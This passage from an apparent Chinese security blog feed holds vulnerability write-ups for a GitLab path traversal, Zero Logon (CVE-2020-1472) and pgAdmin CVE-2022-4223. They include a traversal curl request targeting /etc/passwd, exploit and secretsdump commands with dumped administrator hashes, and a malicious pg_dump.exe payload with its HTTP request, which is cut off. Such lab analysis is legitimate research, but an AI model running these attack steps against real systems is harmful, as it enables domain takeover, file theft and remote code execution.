tabindex="0"><code>这个正则表达式也是用来匹配文件路径字符串中的相对路径（如"./"、"../"等）的，它的含义与前一个问题中的正则表达式非常相似，只是使用了不同的语法来表示相同的含义。具体来说，这个正则表达式的含义如下：
json
\A 匹配字符串的开头
(.{1,2}) 匹配一个或两个任意字符，并将其作为一个分组
\z 匹配字符串的结尾
| 或
\A..\[/\\] 匹配以"../"开头的字符串
| 或
[/\\]..\z 匹配以"/.."结尾的字符串
| 或
[/\\]..\[/\\] 匹配"/../"或"\..\"这样以"/"或"\"开头且以"/"或"\"结尾的字符串
| 或
\n 匹配换行符
) 分组结束
其中，\A、\z和\n分别代表字符串的开头、结尾和换行符，|表示或的关系，[/\\]用来匹配""或"/"这两种目录分隔符，因为在不同的操作系统中，目录分隔符是不同的。
这个正则表达式的作用是匹配一个相对路径字符串，用来检测是否存在不合法的相对路径，例如路径中包含超出根目录的"../"或者".."这样的字符串，或者以"../"开头或以"/.."结尾。如果匹配成功，说明该路径存在不合法的相对路径，需要进行处理或报错。</code></pre><p>补丁还以下路径新增了文件，不难看出是在定义了module和upload对象，而后定义了一个字符串show_path并把它传给了<code>config/routes/uploads.rb</code>执行。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span/></span><span style="display:flex;"><span>spec\requests\uploads_controller_spec<span style="color:#f92672">.</span>rb</span></span><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>require<span style="color:#e6db74">'spec_helper'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">RSpec</span><span style="color:#f92672">.</span>describe<span style="color:#66d9ef">UploadsController</span>,<span style="color:#e6db74">feature_category</span>:<span style="color:#e6db74">:shared</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span><span style="color:#66d9ef">WorkhorseHelpers</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> it_behaves_like<span style="color:#e6db74">'uploads actions'</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> let_it_be(<span style="color:#e6db74">:model</span>) { create(<span style="color:#e6db74">:personal_snippet</span>,<span style="color:#e6db74">:public</span>) }</span></span><span style="display:flex;"><span> let_it_be(<span style="color:#e6db74">:upload</span>) { create(<span style="color:#e6db74">:upload</span>,<span style="color:#e6db74">:personal_snippet_upload</span>,<span style="color:#e6db74">:with_file</span>,<span style="color:#e6db74">model</span>: model) }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># See config/routes/uploads.rb</span></span></span><span style="display:flex;"><span> let(<span style="color:#e6db74">:show_path</span>)<span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"/uploads/-/system/</span><span style="color:#e6db74">#{</span>model<span style="color:#f92672">.</span>model_name<span style="color:#f92672">.</span>singular<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span>model<span style="color:#f92672">.</span>to_param<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span>upload<span style="color:#f92672">.</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>basename(upload<span style="color:#f92672">.</span>path)<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>在<code>config/routes/uploads.rb</code>中，定义了路由匹配规则用来处理上传文件和显示文件的请求，结合<code>spec\requests\uploads_controller_spec.rb</code>的内容可以知道应该是在处理路由<code>get '-/system/:model/:id/:secret/:filename'</code>时，将文件名传给uploads模块的show方法触发漏洞。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>config<span style="color:#f92672">/</span>routes<span style="color:#f92672">/</span>uploads<span style="color:#f92672">.</span>rb</span></span><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>scope<span style="color:#e6db74">path</span>:<span style="color:#e6db74">:uploads</span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Note attachments and User/Group/Project/Topic avatars</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">"-/system/:model/:mounted_as/:id/:filename"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">"uploads#show"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">%r{note|user|group|project|projects\/topic|achievements\/achievement}</span>,<span style="color:#e6db74">mounted_as</span>:<span style="color:#e6db74">/avatar|attachment/</span>,<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># show uploads for models, snippets (notes) available for now</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">'-/system/:model/:id/:secret/:filename'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">'uploads#show'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/personal_snippet|user/</span>, id:<span style="color:#e6db74">/\d+/</span>,<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># show temporary uploads</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">'-/system/temp/:secret/:filename'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">'uploads#show'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Appearance</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">"-/system/:model/:mounted_as/:id/:filename"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">"uploads#show"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/appearance/</span>,<span style="color:#e6db74">mounted_as</span>:<span style="color:#e6db74">/logo|header_logo|pwa_icon|favicon/</span>,<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">/.+/</span> },</span></span><span style="display:flex;"><span><span style="color:#e6db74">as</span>:<span style="color:#e6db74">'appearance_upload'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># create uploads for models, snippets (notes) available for now</span></span></span><span style="display:flex;"><span> post<span style="color:#e6db74">':model'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">'uploads#create'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/personal_snippet|user/</span>, id:<span style="color:#e6db74">/\d+/</span> },</span></span><span style="display:flex;"><span><span style="color:#e6db74">as</span>:<span style="color:#e6db74">'upload'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> post<span style="color:#e6db74">':model/authorize'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">'uploads#authorize'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/personal_snippet|user/</span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Alert Metric Images</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">"-/system/:model/:mounted_as/:id/:filename"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">"uploads#show"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/alert_management_metric_image/</span>,<span style="color:#e6db74">mounted_as</span>:<span style="color:#e6db74">/file/</span>,<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> },</span></span><span style="display:flex;"><span><span style="color:#e6db74">as</span>:<span style="color:#e6db74">'alert_metric_image_upload'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Abuse Reports Images</span></span></span><span style="display:flex;"><span> get<span style="color:#e6db74">"-/system/:model/:mounted_as/:id/:filename"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>:<span style="color:#e6db74">"uploads#show"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">model</span>:<span style="color:#e6db74">/abuse_report/</span>,<span style="color:#e6db74">mounted_as</span>:<span style="color:#e6db74">/screenshot/</span>,<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> },</span></span><span style="display:flex;"><span><span style="color:#e6db74">as</span>:<span style="color:#e6db74">'abuse_report_upload'</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Redirect old note attachments path to new uploads path.</span></span></span><span style="display:flex;"><span>get<span style="color:#e6db74">"files/note/:id/:filename"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">to</span>: redirect(<span style="color:#e6db74">"uploads/note/attachment/%{id}/%{filename}"</span>),</span></span><span style="display:flex;"><span><span style="color:#e6db74">constraints</span>: {<span style="color:#e6db74">filename</span>:<span style="color:#e6db74">%r{[^/]+}</span> }</span></span></code></pre></div><h3 id="坑点">坑点</h3><p><strong>组层数不够</strong></p><p>原先按照官方通告说的至少5层组嵌套，就只新建了5层，而后发送payload，一直报400，一度以为环境是16.0.1修复版本，而后发现是嵌套不够。</p><pre tabindex="0"><code>$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20
&lt;html>
&lt;head>&lt;title>400 Bad Request&lt;/title>&lt;/head>
&lt;body>
&lt;center>&lt;h1>400 Bad Request&lt;/h1>&lt;/center>
&lt;hr>&lt;center>nginx&lt;/center>
&lt;/body>
&lt;/html></code></pre><p>后来得到同事提示，需要至少9层才可以访问到根目录。</p><p><strong>穿越符不够</strong></p><p>经测试，至少需要12个穿越符<code>../</code> 才能成功穿越到根目录</p><p><strong>小结</strong></p><p>本次漏洞分析有点事后诸葛亮，从已知的PoC推测触发的文件路径，但总算成功理解了整个触发文件流，坑点就是nginx解析导致需要足够的group才能穿越到根目录，分析这个漏洞的时候没学过ruby，依靠ChatGPT才能够理解某些代码。</p><p><strong>Created at 2023-05-26T10:36:20+08:00</strong></p></description></item><item><title>Zero Logon 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</link><pubDate>Mon, 08 May 2023 14:39:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</guid><description><h3 id="基本信息">基本信息</h3><p>Netlogon协议认证过程：<img alt="" src="/images/vulnerability/zero-logon.zh-cn.assets/1.png"/></p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>win server 2012</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>利用</strong>
域环境使用Windows server 2012R2搭建，先用<a href="https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py" target="_blank">脚本</a>重置域账户密码<code>python cve-2020-1472-exploit.py WIN2016 192.168.52.130</code>
并抓取数据包
重置之后域账户的密码为空，对应hash为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code></p><p>安装impacket：</p><ul><li><code>python3 -m pipx install impacket</code></li><li><code>pipx ensurepath</code>
使用<code>impacket</code>的<code>secretsdump</code>进行Dcsync，得到Administratr账户的NTLM hash</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py cqy.io/WIN2016<span style="color:#ae81ff">\$</span>@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy<span style="color:#ae81ff">\\</span>administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright<span style="color:#ae81ff">2022</span> SecureAuth Corporation</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials<span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b:::</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:f732d313b5e92585</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div><p><strong>PoC分析</strong>
关键代码是下面这个函数，参数rpc_con是<code>DCERPC_v5</code>对象，描述了rcp链接，</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> attempt<span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, MAX_ATTEMPTS):</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">=</span> try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">if</span> result<span style="color:#f92672">is</span><span style="color:#66d9ef">None</span>:</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">'='</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">''</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">else</span>:</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">break</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">try_zero_authenticate</span>(rpc_con, dc_handle, dc_ip, target_computer):</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Connect to the DC's Netlogon service.</span></span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Use an all-zero challenge and credential.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>    plaintext<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span>    ciphertext<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>   <span style="color:#75715e"># Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>    flags<span style="color:#f92672">=</span><span style="color:#ae81ff">0x212fffff</span></span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Send challenge and authentication request.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>    nrpc<span style="color:#f92672">.</span>hNetrServerReqChallenge(rpc_con, dc_handle<span style="color:#f92672">+</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>, target_computer<span style="color:#f92672">+</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>, plaintext)</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">try</span>:</span></span><span style="display:flex;"><span>        server_auth<span style="color:#f92672">=</span> nrpc<span style="color:#f92672">.</span>hNetrServerAuthenticate3(</span></span><span style="display:flex;"><span>            rpc_con, dc_handle<span style="color:#f92672">+</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>, target_computer<span style="color:#f92672">+</span><span style="color:#e6db74">'$</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>, nrpc<span style="color:#f92672">.</span>NETLOGON_SECURE_CHANNEL_TYPE<span style="color:#f92672">.</span>ServerSecureChannel,</span></span><span style="display:flex;"><span>            target_computer<span style="color:#f92672">+</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>, ciphertext, flags</span></span><span style="display:flex;"><span>        )</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>       <span style="color:#75715e"># It worked!</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>       <span style="color:#66d9ef">assert</span> server_auth[<span style="color:#e6db74">'ErrorCode'</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span><span style="color:#66d9ef">True</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>   <span style="color:#66d9ef">except</span> nrpc<span style="color:#f92672">.</span>DCERPCSessionError<span style="color:#66d9ef">as</span> ex:</span></span><span style="display:flex;"><span>       <span style="color:#75715e"># Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.</span></span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">if</span> ex<span style="color:#f92672">.</span>get_error_code()<span style="color:#f92672">==</span><span style="color:#ae81ff">0xc0000022</span>:</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">return</span><span style="color:#66d9ef">None</span></span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">else</span>:</span></span><span style="display:flex;"><span>            fail(<span style="color:#e6db74">f</span><span style="color:#e6db74">'Unexpected error code from DC:</span><span style="color:#e6db74">{</span>ex<span style="color:#f92672">.</span>get_error_code()<span style="color:#e6db74">}</span><span style="color:#e6db74">.'</span>)</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">except</span><span style="color:#a6e22e">BaseException</span><span style="color:#66d9ef">as</span> ex:</span></span><span style="display:flex;"><span>        fail(<span style="color:#e6db74">f</span><span style="color:#e6db74">'Unexpected error:</span><span style="color:#e6db74">{</span>ex<span style="color:#e6db74">}</span><span style="color:#e6db74">.'</span>)</span></span></code></pre></div><p>在PoC中循环发起认证，每次认证时，client challenge置为0x00 * 8，client credential置为0x00 * 8
在<a href="/zh-cn/research/protocol/netlogon/">netlogon协议</a>中知道，服务器会比较自己计算的ClientCredential和客户端发过来的ClientCredential是否相等，而ClientCredential来源于会话密钥加密ClientChallenge。其中加密算法为AES，使用CFB8模式。该算法过程如下：<img alt="" src="/images/vulnerability/zero-logon.zh-cn.assets/2.png"/>
算法步骤：</p><ol><li>确定一个16字节的初始向量IV。</li><li>将IV和明文组合,例如IV + 明文的前16个字节。</li><li>对组合的数据块进行AES加密,输出一个16字节的密文块。</li><li>从密文块的第一个字节,与明文的第一个字节进行异或,得到密文的第一个字节。</li><li>密文的第一个字节与IV的第一个字节组合,形成一个新的16字节值。</li><li>对这个新的值再次进行AES加密,得到下一个16字节密文块。</li><li>从新密文块取第一个字节,与明文的下一个字节异或,生成密文的下一个字节。</li><li>重复步骤5-7,直到所有明文都被加密。</li><li>若明文不足16的倍数字节,剩余明文使用PKCS7Padding进行填充。</li></ol><p><em>AES-CFB8通过前一个密文块的反馈来影响下一个明文块的加密,从而避免了ECB模式的确定性问题。但必须使用随机的IV来保证安全性。</em></p><p>会话密钥计算公式：KDF(ClientChallenge+ServerChallenge+secret)，在每一轮认证过程中，ServerChallenge都会变化，但Windows中实现的AES-CFB8使用的iv被设为16字节的0x00
攻击者可控ClientChallenge和ClientCredential，CLientChallenge对应于蓝色部分。由于轮认证时ServerChallenge都会改变且不会重复，所以每次计算出的会话密钥都不一样。当ClientChallenge置为0x00 * 8，当第一轮计算时，计算出的结果有1/256概率为0x00，而这个0x00又会作为下一轮输入添加到iv的第一个字节，即有1/256概率计算后的结果和计算前的值一样全为0x00，这样每一轮计算结果都是全为0x00。
这样第一轮计算后在算法中的输入为全0，加密密钥不变，第二轮计算时，结果依然会是0，这样最终算法结果输出会是全0。
由于每轮认证过程中会话密钥都不一样，所以每一轮认证过程时，AES-CFB8第一轮计算的结果都会不一样，结果最多有256种情况，最差的情况在第256轮时计算结果为0x00。</p><p>当AES-CFB8加密结果刚刚好为全0时，客户端发送的ClientCredential也为全0，此时就可以通过服务端的校验，完成身份验证。</p><p>可以编写一段简单的python代码模拟服务端加密过程</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.ciphers<span style="color:#f92672">import</span> Cipher, algorithms, modes</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.backends<span style="color:#f92672">import</span> default_backend</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>iv<span style="color:#f92672">=</span> bytes([</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>])  <span style="color:#75715e"># 16 byte IV</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>plaintext<span style="color:#f92672">=</span> bytes([</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00</span>,</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>])  <span style="color:#75715e"># 8 byte plaintext</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i<span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):</span></span><span style="display:flex;"><span>    key<span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_bytes(<span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># 8 byte key</span></span></span><span style="display:flex;"><span>    cipher<span style="color:#f92672">=</span> Cipher(algorithms<span style="color:#f92672">.</span>AES(key),</span></span><span style="display:flex;"><span>                    modes<span style="color:#f92672">.</span>CFB8(iv),</span></span><span style="display:flex;"><span>                    backend<span style="color:#f92672">=</span>default_backend())</span></span><span style="display:flex;"><span>    encryptor<span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encryptor()</span></span><span style="display:flex;"><span>    ciphertext<span style="color:#f92672">=</span> encryptor<span style="color:#f92672">.</span>update(plaintext)<span style="color:#f92672">+</span> encryptor<span style="color:#f92672">.</span>finalize()</span></span><span style="display:flex;"><span>    print(ciphertext<span style="color:#f92672">.</span>hex())</span></span></code></pre></div><p>在第115次时，加密后的密文为0x0000000000000000<img alt="" src="/images/vulnerability/zero-logon.zh-cn.assets/3.png"/><strong>参考链接</strong></p><blockquote><p><a href="https://xz.aliyun.com/t/8367" target="_blank">https://xz.aliyun.com/t/8367</a></p><p><a href="https://www.anquanke.com/post/id/219374#h3-6" target="_blank">https://www.anquanke.com/post/id/219374#h3-6</a></p><p><a href="https://www.secrss.com/articles/25580" target="_blank">https://www.secrss.com/articles/25580</a></p></blockquote><p><strong>Created at 2023-05-08T14:39:28+08:00</strong></p></description></item><item><title>CVE-2022-4223 PgAdmin RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</link><pubDate>Mon, 08 May 2023 14:18:21 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。</p><h4 id="指纹">指纹</h4><p>略</p><h3 id="影响版本">影响版本</h3><p>pgadmin &lt; 6.17</p><h3 id="环境搭建">环境搭建</h3><ul><li>windows 10</li><li>postgresql13</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>复现</strong>
直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">main</span>(){</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"whoami > c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">public</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">1.txt"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。
发送如下payload，在utility_path指向共享的文件夹路径，</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /misc/validate_binary_path<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">[TARGETHOST]</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">[COOKIES_YOU_FETCHED_IN_ADVANCE]</span></span></span><span style="display:flex;"><span>X-pgA-CSRFToken<span style="color:#f92672">:</span><span style="color:#ae81ff">[CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE]</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span><span 